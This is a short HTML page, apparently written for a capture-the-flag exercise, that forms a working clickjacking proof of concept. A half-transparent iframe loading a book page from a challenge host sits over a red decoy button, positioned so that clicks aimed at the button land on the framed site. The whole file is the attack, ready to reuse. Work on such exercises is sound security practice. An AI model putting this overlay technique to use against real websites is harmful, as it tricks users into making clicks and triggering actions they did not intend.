<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Simple</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100vw; height: 100vh; overflow: hidden; }

        
        #objetivo {
           position: absolute;
           z-index: 1;
           top: 380px; 
           left: 50%;
           transform: translateX(-50%);
           width: 900px;
           height: 40px;
           cursor: pointer;
           background: red;
           border: none;
           color: white;
       }

       iframe {
           position: absolute;
           top: -500px;
           left: 0;
           width: 100%;
           height: 1200px; 
           border: none;
           z-index: 2;
           opacity: 0.5; 
       }
    </style>
</head>
<body>

    <button id="objetivo">OBJETIVO</button>

    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>

</body>
</html>
